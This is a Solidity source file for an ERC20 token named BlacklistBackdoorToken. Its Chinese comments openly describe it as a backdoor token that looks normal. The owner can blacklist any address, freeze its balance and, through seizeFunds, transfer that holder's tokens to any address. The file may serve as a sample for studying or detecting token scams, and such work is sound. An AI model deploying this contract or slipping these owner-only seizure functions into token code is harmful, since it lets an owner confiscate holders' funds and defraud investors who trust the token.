// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

/**
 * @title BlacklistBackdoorToken
 * @notice 黑名单后门代币
 * @dev 表面正常，但owner可以冻结任意地址并转移其资金
 */
contract BlacklistBackdoorToken is ERC20 {
    address public owner;
    mapping(address => bool) public blacklisted;
    mapping(address => uint256) public frozenBalances;

    event Blacklisted(address indexed account);
    event FundsFrozen(address indexed account, uint256 amount);
    event FundsSeized(address indexed from, address indexed to, uint256 amount);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor(string memory name, string memory symbol, uint256 supply) ERC20(name, symbol) {
        owner = msg.sender;
        _mint(msg.sender, supply);
    }

    /**
     * @notice 后门1：将地址加入黑名单并冻结余额
     */
    function blacklistAccount(address account) external onlyOwner {
        blacklisted[account] = true;
        frozenBalances[account] = balanceOf(account);
        emit Blacklisted(account);
        emit FundsFrozen(account, frozenBalances[account]);
    }

    /**
     * @notice 后门2：没收黑名单用户的资金
     */
    function seizeFunds(address from, address to) external onlyOwner {
        require(blacklisted[from], "Not blacklisted");
        uint256 amount = frozenBalances[from];
        _transfer(from, to, amount);
        frozenBalances[from] = 0;
        emit FundsSeized(from, to, amount);
    }

    /**
     * @notice 重写转账函数：黑名单用户无法转账
     */
    function _update(address from, address to, uint256 amount) internal override {
        require(!blacklisted[from], "Sender blacklisted");
        require(!blacklisted[to], "Receiver blacklisted");
        super._update(from, to, amount);
    }
}
